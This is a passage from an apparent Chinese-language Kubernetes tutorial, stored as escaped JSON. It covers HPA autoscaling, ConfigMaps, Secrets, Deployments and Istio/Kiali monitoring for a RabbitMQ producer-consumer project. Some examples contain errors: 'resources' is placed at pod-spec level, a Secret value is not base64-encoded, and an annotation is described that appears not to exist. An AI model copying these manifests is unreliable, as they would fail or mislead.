\u7684\u6570\u91cf\u3002\u4f46\u5728\u73b0\u5b9e\u4e2d\uff0c\u5927\u90e8\u5206\u670d\u52a1\u4e0b\uff0c\u6211\u4eec\u90fd\u5e0c\u671b\u80fd\u81ea\u52a8\u6269\u7f29\uff0c\u4ee5\u8282\u7701\u8ba1\u7b97\u8d44\u6e90\u3002\u4f8b\u5982\uff0c\u5728\u8d2d\u7269\u6de1\u5b63\uff0c\u6211\u4eec\u5e0c\u671b\u51cf\u5c11\u670d\u52a1\u5668\u6570\u91cf\u6765\u7f29\u51cf\u6210\u672c\uff0c\u800c\u5728\u8d2d\u7269\u65fa\u5b63\uff0c\u6211\u4eec\u5e0c\u671b\u589e\u52a0\u670d\u52a1\u5668\u6570\u91cf\u6765\u63d0\u9ad8\u6027\u80fd\u3002 \u5bb9\u5668\u7684\u6269\u7f29\u5bb9\u662f k8s \u7684\u6838\u5fc3\u529f\u80fd\u4e4b\u4e00\u3002\u6269\u5bb9\u6709\u4e24\u4e2a\u7ef4\u5ea6\uff0c\u4e00\u4e2a\u662f\u6c34\u5e73\u6269\u5bb9\uff0c\u5373\u589e\u52a0 Pod \u7684\u6570\u91cf\uff0c\u53e6\u4e00\u4e2a\u662f\u5782\u76f4\u6269\u5bb9\uff0c\u5373\u589e\u52a0 Pod \u7684\u8d44\u6e90\u3002 \u6269\u7f29\u662f\u5341\u5206\u590d\u6742\u7684\uff0c\u6211\u4eec\u53ea\u4ecb\u7ecd\u6700\u7b80\u5355\u7684\u81ea\u52a8\u6c34\u5e73\u6269\u5bb9\u3002HorizontalPodAutoscaler \u662f k8s \u7684\u6c34\u5e73\u6269\u5bb9\u5668\u3002\u5b83\u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 CPU \u4f7f\u7528\u7387\u548c\u5185\u5b58\u4f7f\u7528\u7387\uff0c\u81ea\u52a8\u8c03\u6574 Pod \u7684\u6570\u91cf\u3002 apiVersion: autoscaling/v2 kind: HorizontalPodAutoscaler metadata: name: producer-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: producer minReplicas: 1 maxReplicas: 10 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 \u8fd9\u91cc\u7684 minReplicas \u548c maxReplicas \u5206\u522b\u662f\u6700\u5c0f\u548c\u6700\u5927 Pod \u6570\u91cf\u3002 metrics \u662f\u6c34\u5e73\u6269\u5bb9\u7684\u6307\u6807\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86 CPU \u4f7f\u7528\u7387\u3002 averageUtilization \u662f CPU \u4f7f\u7528\u7387\u7684\u76ee\u6807\u503c\u3002 \u4e0a\u9762\u7684\u914d\u7f6e\u65b9\u5f0f\u4e0b\uff0c\u5982\u679c CPU \u7684\u5e73\u5747\u4f7f\u7528\u7387\u8d85\u8fc7 50%\uff0c\u90a3\u4e48\u5c31\u4f1a\u589e\u52a0 Pod \u7684\u6570\u91cf\u3002\u5982\u679c CPU \u7684\u5e73\u5747\u4f7f\u7528\u7387\u4f4e\u4e8e 50%\uff0c\u90a3\u4e48\u5c31\u4f1a\u51cf\u5c11 Pod \u7684\u6570\u91cf\u3002\u4f46\u662f\u65e0\u8bba\u5982\u4f55\uff0c\u6700\u591a\u53ea\u4f1a\u589e\u52a0\u5230 10 \u4e2a Pod\uff0c\u6700\u5c11\u53ea\u4f1a\u51cf\u5c11\u5230 1 \u4e2a Pod\u3002 \u6b64\u5916\uff0c\u5e38\u7528\u7684\u6307\u6807\u8fd8\u6709\u5185\u5b58\uff0c\u4f7f\u7528\uff0c metrics: - type: Resource resource: name: memory target: type: Utilization averageUtilization: 50 \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u7b97\u6cd5\u662f\u6ed1\u52a8\u7a97\u53e3\u7b97\u6cd5\u3002\u5982\u679c\u8981\u914d\u7f6e\u7b97\u6cd5\u7684\u53c2\u6570\uff0c\u4f7f\u7528 behavior \u5b57\u6bb5\u3002 behavior: scaleDown: stabilizationWindowSeconds: 300 scaleUp: stabilizationWindowSeconds: 300 \u4e0a\u9762\u7684 behavior \u4e2d\uff0cscaleDown \u548c scaleUp \u5206\u522b\u662f\u7f29\u5bb9\u548c\u6269\u5bb9\u7684\u914d\u7f6e\u3002 stabilizationWindowSeconds \u662f\u7a33\u5b9a\u7a97\u53e3\u7684\u65f6\u95f4\uff0c\u5373\u4e0a\u6587\u5e73\u5747\u503c\u8ba1\u7b97\u7684\u65f6\u95f4\u7a97\u53e3\u3002\u5f53\u7136\uff0c\u8fd8\u6709\u66f4\u590d\u6742\u7684\u914d\u7f6e\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u751f\u4ea7\u7ea7\u65e0\u72b6\u6001\u670d\u52a1\u90e8\u7f72 \u73b0\u5728\uff0c\u6211\u4eec\u91cd\u65b0\u90e8\u7f72\u6211\u4eec\u4e4b\u524d\u7684\u7b80\u5355\u9879\u76ee\u3002\u6709\u4e00\u4e2a producer \u670d\u52a1\uff0c\u4e00\u4e2a\u5185\u5bb9\u968f\u65f6\u53ef\u4ee5\u4e22\u5f03\u7684\u6d88\u606f\u961f\u5217\uff0c\u4e00\u4e2a consumer \u670d\u52a1\u3002\u6211\u4eec\u5e0c\u671b\u6240\u6709\u7684\u670d\u52a1\u90fd\u662f\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u4e14\u80fd\u81ea\u52a8\u6269\u5bb9\u3002\u6b64\u5916\uff0c\u914d\u7f6e\u4fe1\u606f\u4f7f\u7528 ConfigMap \u5b58\u50a8\uff0c\u654f\u611f\u4fe1\u606f\u4f7f\u7528 Secret \u5b58\u50a8\uff0c\u8fd8\u8981\u652f\u6301\u81ea\u52a8\u6269\u5bb9\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4f7f\u7528 helm \u6765\u6253\u5305\uff0c\u5e76\u5b9e\u73b0\u6a21\u7248\u3002 \u914d\u7f6e\u53c2\u6570 \u6211\u4eec\u5e0c\u671b\u80fd\u4f7f\u7528 ConfigMap \u5b58\u50a8 RabbitMQ \u7684\u7528\u6237\u540d\u4ee5\u53ca\u961f\u5217\u540d\u79f0\u3002 apiVersion: v1 kind: ConfigMap metadata: name: rabbitmq-config data: username: guest queue: food \u7136\u540e\u8fd8\u6709\u4e00\u4e2a Secret\uff0c\u5b58\u50a8 RabbitMQ \u7684\u5bc6\u7801\u3002 apiVersion: v1 kind: Secret metadata: name: rabbitmq-secret type: Opaque data: password: password \u670d\u52a1\u90e8\u7f72 \u6211\u4eec\u8981\u4fee\u6539\u4e00\u4e0b\u6211\u4eec\u7684 Producer \u4e0e Consumer \u7684\u8fde\u63a5\u90e8\u5206\uff0c import { Hono } from 'hono' import { connect } from 'amqplib' import { config } from 'dotenv' config() const mq = `amqp://${process.env.RABBITMQ_USERNAME}:${process.env.RABBITMQ_PASSWORD}@message-queue:5672` async function connectMq() { const connection = await connect(mq) const channel = await connection.createChannel() await channel.assertQueue(process.env.RABBITMQ_QUEUE) return channel } const channel = connectMq() \u7136\u540e\u4fee\u6539 deployment \u90e8\u5206\uff0c apiVersion: apps/v1 kind: Deployment metadata: name: producer spec: replicas: 1 selector: matchLabels: app: producer template: metadata: labels: app: producer spec: resources: requests: memory: \"64Mi\" cpu: \"100m\" limits: memory: \"128Mi\" cpu: \"100m\" containers: - name: producer image: producer env: - name: RABBITMQ_USERNAME valueFrom: configMapKeyRef: name: rabbitmq-config key: username - name: RABBITMQ_QUEUE valueFrom: configMapKeyRef: name: rabbitmq-config key: queue - name: RABBITMQ_PASSWORD valueFrom: secretKeyRef: name: rabbitmq-secret key: password Consumer \u90e8\u5206\u7c7b\u4f3c\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e RabbitMQ\uff0c\u6211\u4eec\u540c\u6837\u8fdb\u884c\u914d\u7f6e\uff0c apiVersion: apps/v1 kind: Deployment metadata: name: message-queue spec: replicas: 1 selector: matchLabels: app: message-queue template: metadata: labels: app: message-queue spec: resources: requests: memory: \"64Mi\" cpu: \"100m\" limits: memory: \"128Mi\" cpu: \"100m\" containers: - name: message-queue image: rabbitmq ports: - containerPort: 5672 env: - name: RABBITMQ_DEFAULT_USER valueFrom: configMapKeyRef: name: rabbitmq-config key: username - name: RABBITMQ_DEFAULT_PASS valueFrom: secretKeyRef: name: rabbitmq-secret key: password Service \u5bf9\u8c61\u4e0d\u53d8\u3002 \u6d41\u91cf\u76d1\u63a7 \u6211\u4eec\u7ee7\u7eed\u4f7f\u7528\u4e4b\u524d\u7684\u7f51\u5173\u5373\u53ef\uff0c\u914d\u7f6e\u8fc7\u7a0b\u7701\u7565\u3002 \u4e0d\u8fc7\uff0c\u6211\u4eec\u524d\u9762\u6ca1\u6709\u4ecb\u7ecd\u5bf9\u8c03\u8bd5\u5f88\u91cd\u8981\u7684\u670d\u52a1\u94fe\u8def\u8ffd\u8e2a\u3002\u670d\u52a1\u94fe\u8def\u8ffd\u8e2a\u662f\u4e00\u79cd\u76d1\u63a7\u624b\u6bb5\uff0c\u7528\u4e8e\u76d1\u63a7\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u3002kiali \u662f Istio \u7684\u76d1\u63a7\u5de5\u5177\u3002 \u6211\u4eec\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6dfb\u52a0 Istio\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/kiali.yaml \u6ce8\u610f\uff0c\u5c31\u50cf\u6211\u4eec\u4e4b\u524d\u5b66\u4e60 MicroMeter \u4e00\u6837\uff0ckiali \u53ea\u662f\u4e00\u4e2a dashboard\u3002\u5b83\u9700\u8981\u4ece Prometheus \u548c Grafana \u4e2d\u83b7\u53d6\u6570\u636e\u3002\u6211\u4eec\u9700\u8981\u5148\u5b89\u88c5 Prometheus \u548c Grafana\u3002 kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/grafana.yaml \u4ee5\u53ca\uff0c kubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.23/samples/addons/prometheus.yaml \u6ce8\u610f\uff0c\u540e\u8005 prometheus \u7684\u9ed8\u8ba4\u914d\u7f6e\u9002\u5408\u5c0f\u96c6\u7fa4\u800c\u975e\u5927\u96c6\u7fa4\u3002\u5982\u679c\u96c6\u7fa4\u53d8\u5f97\u592a\u5927\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 Service Mesh \u6765\u4e3a\u96c6\u7fa4\u63d0\u4f9b\u57fa\u7840\u8bbe\u65bd\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u4ecb\u7ecd Service Mesh\u3002 \u73b0\u5728\uff0c\u4f7f\u7528\uff0c istioctl dashboard kiali \u6765\u6253\u5f00 kiali\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb\uff0c\u8c03\u7528\u56fe\uff0c\u6d41\u91cf\u7b49\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528 helm\uff0c\u5e94\u8be5\u628a\u4e0a\u9762\u7684\u6587\u4ef6\u653e\u5165 template \u4e2d\uff0c\u7136\u540e\u4f7f\u7528 helm install \u6765\u5b89\u88c5\u3002 \u4e0d\u8fc7\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u6d88\u606f\u961f\u5217\u7684\u6d41\u91cf\u6ca1\u6709\u663e\u793a\u51fa\u6765\u3002\u6211\u4eec\u9700\u8981\u7ed9 RabbitMQ \u6dfb\u52a0\u63d2\u4ef6\uff0c rabbitmq-plugins enable rabbitmq_prometheus \u8fd9\u9700\u8981\u6211\u4eec\u4f7f\u7528 dockerfile \u542f\u52a8 RabbitMQ \u65f6\u6dfb\u52a0\u63d2\u4ef6\u3002 FROM rabbitmq:4.0-rc-management RUN rabbitmq-plugins enable rabbitmq_prometheus \u7136\u540e\u4f7f\u7528\u8fd9\u4e2a dockerfile \u6765\u6784\u5efa\u955c\u50cf\u5373\u53ef\u3002\u91cd\u542f\u6d88\u606f\u961f\u5217\u540e\uff0c\u8bb0\u5f97\u91cd\u542f Consumer \u548c Producer\u3002 \u81ea\u52a8\u6269\u5bb9 \u6211\u4eec\u4f7f\u7528 HorizontalPodAutoscaler \u6765\u5b9e\u73b0\u81ea\u52a8\u6269\u5bb9\u3002 apiVersion: autoscaling/v2 kind: HorizontalPodAutoscaler metadata: name: producer-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: producer minReplicas: 1 maxReplicas: 10 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 consumer \u540c\u7406\u3002","title":"k8s \u65e0\u72b6\u6001\u670d\u52a1"},{"location":"22/#ch22-k8s","text":"\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u4ece\u5b9e\u8df5\u7684\u89d2\u5ea6\u8bb2\u89e3\u4e86 k8s \u7684\u65e0\u72b6\u6001\u670d\u52a1\u7684\u57fa\u672c\u90e8\u7f72\uff0c\u4ee5\u53ca\u5982\u4f55\u6253\u5305\u5e94\u7528\uff0c\u5982\u4f55\u914d\u7f6e\u7f51\u5173\u3002\u8fd9\u4e00\u8282\uff0c\u6211\u4eec\u4f1a\u4ecb\u7ecd k8s \u4e2d\u7684\u65e0\u72b6\u6001\u670d\u52a1\u7684\u751f\u4ea7\u7ea7\u90e8\u7f72\u3002 k8s \u4e2d\uff0c\u670d\u52a1\u53ef\u4ee5\u6839\u636e\u5176\u662f\u5426\u6709\u72b6\u6001\uff0c\u5373\u662f\u5426\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u5206\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u548c\u6709\u72b6\u6001\u670d\u52a1\u3002\u65e0\u72b6\u6001\u670d\u52a1\u662f\u6307\u670d\u52a1\u4e0d\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5219\u9700\u8981\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u4e0d\u80fd\u968f\u65f6\u91cd\u542f\u3002\u65e0\u72b6\u6001\u670d\u52a1\u7684\u90e8\u7f72\u76f8\u5bf9\u7b80\u5355\uff0c\u56e0\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5219\u9700\u8981\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002","title":"\u5fae\u670d\u52a1\u901f\u6210 Ch22 k8s \u65e0\u72b6\u6001\u670d\u52a1"},{"location":"22/#k8s","text":"\u524d\u9762\u6211\u4eec\u4e00\u76f4\u5728\u7f16\u5199\u4e00\u4e9b\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u4e9b\u914d\u7f6e\u6587\u4ef6\u5176\u5b9e\u662f k8s \u5bf9\u8c61\u7684\u5b9a\u4e49\u3002k8s \u4e2d\u6709\u5f88\u591a\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6765\u5b9a\u4e49\u8fd9\u4e9b\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7 k8s \u7684 API \u6765\u521b\u5efa\u8fd9\u4e9b\u5bf9\u8c61\u3002 \u8981\u67e5\u770b\u76ee\u524d\u5df2\u7ecf\u6ce8\u518c\u7684\u5bf9\u8c61\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\uff0c kubectl api-resources","title":"k8s \u5bf9\u8c61"},{"location":"22/#_1","text":"\u4e00\u4e2a k8s \u5bf9\u8c61\u5305\u542b\uff0c API \u7248\u672c\uff0c apiVersion \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684 API \u7248\u672c\u3002 \u7c7b\u578b\uff0c kind \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u7c7b\u578b\u3002 \u5143\u6570\u636e\uff0c metadata \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u5143\u6570\u636e\uff0c\u4f8b\u5982\u540d\u79f0\u3001\u6807\u7b7e\u7b49\u3002 \u89c4\u8303\uff0c\u901a\u5e38\u662f spec \uff0c\u6307\u5b9a\u5bf9\u8c61\u7684\u89c4\u8303\uff0c\u4f8b\u5982\u5bb9\u5668\u7684\u955c\u50cf\u3001\u7aef\u53e3\u7b49\u3002 \u8fd9\u4e9b\u5b57\u6bb5\u662f k8s \u5bf9\u8c61\u7684\u57fa\u672c\u5b57\u6bb5\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u8fd9\u4e9b\u5b57\u6bb5\u3002","title":"\u5fc5\u987b\u5b57\u6bb5"},{"location":"22/#_2","text":"\u4e4b\u524d\u6211\u4eec\u5728\u4f7f\u7528 Service \u65f6\u53d1\u73b0\uff0cService \u662f\u4e00\u4e2a\u8d1f\u8f7d\u5747\u8861\u5230\u8fbe\u82e5\u5e72 Pod \u8bf7\u6c42\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u9700\u8981\u9009\u4e2d\u4e00\u4e9b Pod\u3002\u5f53\u65f6\u6211\u4eec\u4f7f\u7528\u7684\u662f\uff0c selector: app: producer \u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u5728\u521b\u5efa deployment \u65f6\uff0c\u4e3a pod \u6307\u5b9a\u7684\u6a21\u7248\u4e3a\uff0c metadata: labels: app: producer \u8fd9\u5c31\u662f\u4e00\u4e2a\u9009\u62e9\u5668\uff0cService \u4f1a\u6839\u636e\u8fd9\u4e2a\u9009\u62e9\u5668\u9009\u62e9\u5bf9\u5e94\u7684 Pod\u3002\u8fd9\u91cc\u7684 label \u5c31\u662f\u5bf9\u8c61\u7684\u5143\u6570\u636e\u3002 k8s \u4e2d\uff0c\u9996\u5148\u6309\u547d\u540d\u7a7a\u95f4\u5212\u5206\u903b\u8f91\u96c6\u7fa4\u3002\u6bcf\u4e2a\u903b\u8f91\u96c6\u7fa4\u5305\u542b\u82e5\u5e72\u5bf9\u8c61\u3002\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684 UID\u3002\u540c\u65f6\uff0c\u6bcf\u4e2a\u5bf9\u8c61\u8fd8\u53ef\u4ee5\u5e26\u6709 metadata\uff0c\u5305\u62ec\u540d\u79f0\u3001\u547d\u540d\u7a7a\u95f4\u3001\u6807\u7b7e\u3001\u6ce8\u89e3\u3002 \u540d\u79f0\u901a\u5e38\u662f\u7528\u6237\u4e3a\u4e86\u65b9\u4fbf\u6307\u5b9a\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u4e0e UID \u529f\u80fd\u76f8\u540c\uff0c\u4f46\u662f UID \u662f k8s \u81ea\u52a8\u751f\u6210\u7684\uff0c\u540d\u79f0\u662f\u7528\u6237\u6307\u5b9a\u7684\u3002\u8fd9\u662f metadata \u7684 name \u5b57\u6bb5\u3002 labels \u662f\u4e00\u4e2a\u5b57\u5178\uff0c\u5305\u542b\u4e86\u4e00\u4e9b\u952e\u503c\u5bf9\u3002\u8fd9\u4e9b\u952e\u503c\u5bf9\u53ef\u4ee5\u7528\u6765\u9009\u62e9\u5bf9\u8c61\u3002\u4f8b\u5982\uff0cService \u4f1a\u6839\u636e selector \u9009\u62e9\u5bf9\u5e94\u7684 Pod\u3002\u8fd9\u662f metadata \u7684 labels \u5b57\u6bb5\u3002\u5e38\u7528\u7684\u4e00\u4e2a\u4f8b\u5b50\u662f app: producer \uff0c\u8868\u793a\u8fd9\u4e2a\u5bf9\u8c61\u662f\u4e00\u4e2a producer \u670d\u52a1\u3002\u6b64\u5916\uff0c\u6709\u7684\u670d\u52a1\u7f51\u683c\uff08\u540e\u9762\u4f1a\u4ecb\u7ecd\uff09\u4f1a\u6839\u636e version: v1 \u9009\u62e9\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u5982\u679c\u9700\u8981\u4e3a\u5bf9\u8c61\u6307\u660e\u547d\u540d\u7a7a\u95f4\uff0c\u53ef\u4ee5\u4f7f\u7528 metadata \u7684 namespace \u5b57\u6bb5\u3002\u5982\u679c\u4e0d\u6307\u5b9a\uff0c\u90a3\u4e48\u9ed8\u8ba4\u4e3a default \u547d\u540d\u7a7a\u95f4\u3002 \u6ce8\u89e3\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u4f7f\u7528\u8fc7\uff0c\u5b83\u662f metadata \u7684 annotations \u5b57\u6bb5\u3002\u6ce8\u89e3\u662f\u4e00\u4e9b\u952e\u503c\u5bf9\u3002\u4e0e labels \u4e0d\u540c\uff0c\u6ce8\u89e3\u4e0d\u662f\u5355\u7eaf\u7684\u6807\u8bb0\uff0c\u800c\u662f\u6709\u529f\u80fd\u7684\uff0c\u4f8b\u5982\uff0c\u53ef\u4ee5\u901a\u8fc7 imagerregistory \u6ce8\u89e3\u6307\u5b9a Pod \u955c\u50cf\u7684\u4ed3\u5e93\u3002","title":"\u5bf9\u8c61\u5143\u6570\u636e"},{"location":"22/#_3","text":"\u9996\u5148\u6211\u4eec\u4ecb\u7ecd\u9700\u8981\u4f7f\u7528\u5230\u7684\u5bf9\u8c61\uff0c\u524d\u9762\u4ecb\u7ecd\u5230\u7684\u4f1a\u4e00\u7b14\u5e26\u8fc7\u3002","title":"\u65e0\u72b6\u6001\u670d\u52a1\u5bf9\u8c61"},{"location":"22/#pod","text":"Pod \u662f k8s \u7684\u6700\u5c0f\u90e8\u7f72\u5355\u5143\uff0c\u662f\u4e00\u4e2a\u6216\u591a\u4e2a\u5bb9\u5668\u7684\u96c6\u5408\u3002Pod \u4e2d\u7684\u5bb9\u5668\u5171\u4eab\u7f51\u7edc\u548c\u5b58\u50a8\uff0c\u53ef\u4ee5\u901a\u8fc7 localhost \u76f4\u63a5\u901a\u4fe1\u3002Pod \u662f\u65e0\u72b6\u6001\u670d\u52a1\u7684\u57fa\u672c\u90e8\u7f72\u5355\u5143\u3002","title":"Pod"},{"location":"22/#replicaset","text":"ReplicaSet \u662f Pod \u7684\u63a7\u5236\u5668\uff0c\u7528\u4e8e\u4fdd\u8bc1 Pod \u7684\u6570\u91cf\u3002ReplicaSet \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 Pod \u6a21\u677f\uff0c\u4fdd\u8bc1 Pod \u7684\u6570\u91cf\u3002\u5982\u679c Pod \u6302\u6389\uff0cReplicaSet \u4f1a\u81ea\u52a8\u91cd\u542f Pod\u3002","title":"ReplicaSet"},{"location":"22/#deployment","text":"Deployment \u662f ReplicaSet \u7684\u63a7\u5236\u5668\uff0c\u7528\u4e8e\u4fdd\u8bc1 ReplicaSet \u7684\u6570\u91cf\u3002Deployment \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 ReplicaSet \u6a21\u677f\uff0c\u4fdd\u8bc1 ReplicaSet \u7684\u6570\u91cf\u3002\u5982\u679c ReplicaSet \u6302\u6389\uff0cDeployment \u4f1a\u81ea\u52a8\u91cd\u542f ReplicaSet\u3002 \u56e0\u6b64\uff0cDeployment \u53ea\u80fd\u7528\u4e8e\u90e8\u7f72\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u56e0\u4e3a\u65e0\u72b6\u6001\u670d\u52a1\u53ef\u4ee5\u968f\u65f6\u91cd\u542f\u3002\u5982\u679c\u670d\u52a1\u6709\u72b6\u6001\uff0c\u90a3\u4e48\u91cd\u542f\u540e\u6570\u636e\u4f1a\u4e22\u5931\u3002 Deployment \u53ef\u4ee5\u6307\u5b9a Resources\uff0c\u4f8b\u5982 CPU \u548c\u5185\u5b58\u3002 resources: requests: memory: \"64Mi\" cpu: \"250m\" limits: memory: \"128Mi\" cpu: \"500m\" \u8fd9\u91cc m \u8868\u793a milli\uff0c\u5373 1/1000\uff0cCPU \u7684\u5355\u4f4d\u662f\u6838\u5fc3\u6570\u3002 requests \u8868\u793a\u8bf7\u6c42\u7684\u8d44\u6e90\uff0c limits \u8868\u793a\u9650\u5236\u7684\u8d44\u6e90\u3002","title":"Deployment"},{"location":"22/#service","text":"Service \u662f Pod \u7684\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u7528\u4e8e\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230 Pod\u3002Service \u4f1a\u6839\u636e\u7528\u6237\u5b9a\u4e49\u7684 Pod Selector\uff0c\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u5bf9\u5e94\u7684 Pod\u3002Service \u6709\u56db\u79cd\u7c7b\u578b\uff0c\u5206\u522b\u662f ClusterIP\uff0cNodePort\uff0cLoadBalancer \u548c ExternalName\u3002","title":"Service"},{"location":"22/#configmap","text":"\u524d\u9762\u6211\u4eec\u4f7f\u7528 helm \u6a21\u7248\u5b9e\u73b0\u4e86\u7528\u6237\u81ea\u5b9a\u4e49\uff0c\u4f46\u662f\u5982\u6b64\u64cd\u4f5c\uff0c\u6bcf\u6b21\u90fd\u9700\u8981\u91cd\u65b0\u90e8\u7f72\u3002ConfigMap \u53ef\u4ee5\u5c06\u914d\u7f6e\u6587\u4ef6\u72ec\u7acb\u51fa\u6765\uff0c\u7136\u540e\u6302\u8f7d\u5230 Pod \u4e2d\u3002\u8fd9\u6837\uff0c\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 ConfigMap \u6765\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u800c\u4e0d\u9700\u8981\u91cd\u65b0\u90e8\u7f72 Deployment\u3002 ConfigMap \u6709\u4e00\u4e2a\u989d\u5916\u7684\u5b57\u6bb5\uff0c data \uff0c\u7528\u4e8e\u5b58\u653e\u914d\u7f6e\u4fe1\u606f\u3002 apiVersion: v1 kind: ConfigMap metadata: name: username-password-config data: username: admin password: admin \u8fd9\u91cc\u7684 data \u5c31\u662f\u666e\u901a\u7684 yaml\uff0c\u53ef\u4ee5\u5b58\u653e\u4efb\u610f\u914d\u7f6e\u4fe1\u606f\u3002 \u6b64\u5916\uff0c\u5982\u679c\u4f60\u786e\u5b9a\u4f60\u7684 ConfigMap \u4e0d\u4f1a\u5728\u91cd\u65b0\u90e8\u7f72\u524d\u6539\u53d8\uff0c\u53ef\u4ee5\u4f7f\u7528 immutable \u5b57\u6bb5\u6765\u6307\u5b9a ConfigMap \u662f\u4e0d\u53ef\u53d8\u7684\u3002 # ... metadata: name: username-password-config # ... immutable: true \u5982\u679c\u8981\u8ba9 Pod \u8bfb\u53d6\u5230 ConfigMap\uff0c\u5e38\u7528\u7684\u662f\u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5\u3002","title":"ConfigMap"},{"location":"22/#configmap_1","text":"Pod \u672c\u8eab\u5c31\u662f Docker \u5bb9\u5668\uff0c\u800c Docker \u5bb9\u5668\u6709 Volume\uff0c\u7528\u4e8e\u6302\u8f7d\u5916\u90e8\u6587\u4ef6\u3002ConfigMap \u81ea\u8eab\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\uff0c\u88ab\u6302\u8f7d\u5230 Pod \u4e2d\u3002 apiVersion: v1 kind: Pod metadata: name: producer spec: containers: - name: producer image: producer volumeMounts: - name: username-password-volume mountPath: \"/conf\" readOnly: true volumes: - name: username-password-volume configMap: name: username-password-config \u5728\u4e0a\u9762\u7684 Pod \u914d\u7f6e\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u5728 volumes \u4e2d\u5c06 ConfigMap \u5b9a\u4e49\u6210\u4e86\u4e00\u4e2a Volume\u3002\u7136\u540e\u5728 containers \u4e2d\u5c06\u8fd9\u4e2a Volume \u6302\u8f7d\u5230\u4e86 /conf \u8def\u5f84\u3002 \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8bfb\u53d6 /conf \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff0c\u5373 ConfigMap\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 Javascript\u3002 import * as fs from 'fs'; const username = fs.readFileSync('/conf/username', 'utf8'); const password = fs.readFileSync('/conf/password', 'utf8'); \u6ce8\u610f\uff0c\u5728\u9664\u4e86\u73af\u5883\u53d8\u91cf\u6a21\u5f0f\u4ee5\u5916\u7684\u6a21\u5f0f\u4e0b\uff0cConfigMap \u66f4\u65b0\u65f6\uff0c\u5176\u88ab\u6620\u5c04\u7684\u5185\u5bb9\uff08\u4f8b\u5982\u8fd9\u91cc\u7684\u6587\u4ef6\uff09\uff0c\u4f1a\u88ab\u4e00\u5e76\u5237\u65b0\u3002\u4f46\u662f\uff0c\u7a0b\u5e8f\u9700\u8981\u91cd\u65b0\u8bfb\u53d6\u624d\u80fd\u83b7\u53d6\u5230\u65b0\u7684\u5185\u5bb9\u3002","title":"\u5c06 ConfigMap \u4f5c\u4e3a\u6587\u4ef6"},{"location":"22/#configmap_2","text":"\u4f7f\u7528\u4ee5\u4e0b\u7684\u914d\u7f6e\u65b9\u5f0f\u6765\u628a ConfigMap \u52a0\u8f7d\u6210\u73af\u5883\u53d8\u91cf\uff0c apiVersion: v1 kind: Pod metadata: name: producer spec: containers: - name: producer image: producer env: - name: CONFIG_MAP_USERNAME valueFrom: configMapKeyRef: name: username-password-config key: username - name: CONFIG_MAP_PASSWORD valueFrom: configMapKeyRef: name: username-password-config key: password \u4f46\u662f\uff0c\u6ce8\u610f\uff0cPod 